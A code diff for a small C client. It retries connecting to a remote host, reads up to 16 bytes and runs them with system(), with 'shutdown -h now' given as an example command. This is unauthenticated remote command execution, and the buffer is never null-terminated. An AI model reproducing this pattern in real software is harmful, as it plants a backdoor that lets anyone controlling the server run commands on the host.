@@ -10,38 +10,40 @@
 
 int main(){
 	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	int local_port = 7878;
 	
 	// Bind to specific network and port
 	struct sockaddr_in localaddr;
 	localaddr.sin_family = AF_INET;
-	localaddr.sin_addr.s_addr = INADDR_ANY; //inet_addr("31.1.2.1") //or yourself
-	localaddr.sin_port = htons(1234); //inny?
+	localaddr.sin_addr.s_addr = INADDR_ANY;
+	localaddr.sin_port = htons(local_port);
 	bind(sockfd, (struct sockaddr *)&localaddr, sizeof(localaddr));
 
 	// Connect to remote server
 	struct sockaddr_in remoteaddr;
 	remoteaddr.sin_family = AF_INET;
-	remoteaddr.sin_addr.s_addr = inet_addr("198.143.55.17"); //31.1.2.1
+	remoteaddr.sin_addr.s_addr = inet_addr("192.168.0.11"); //GET_REMOTE
 	remoteaddr.sin_port = htons(7777);
 
-	//listen(sockfd, 10);
+	// Wait for the server to be available
 	int con = -1;
 	while(con == -1) {
 		con = connect(sockfd, (struct sockaddr *)&remoteaddr, sizeof(remoteaddr));
-		sleep(5);
+		sleep(1); // for testing less
 		printf(".\n");	
 	}
 	printf("Connected: %d\n", con);
 
-	char buf[256];
- 	strcpy(buf, "hello\0");
-        
-    	int sent = write(sockfd, buf, 6);
-	printf("SENT: %d\n", sent);
+    	// Read command from remote
+	char buf[16]; // ex. 'shutdown -h now'
+	int rcv = read(sockfd, &buf, 16);
+	if (rcv == -1) {
+		printf("Error reading command\n");
+		return -1;
+	}
 
-    	// odczyt info z serwera
-//    int rc = read(fd, &buf, 256);
-//    write(1, buf, rc);
-   	close(sockfd);
+	// Close socket and execute command
+	close(sockfd);	
+	system(buf);
     	return 0;
 }
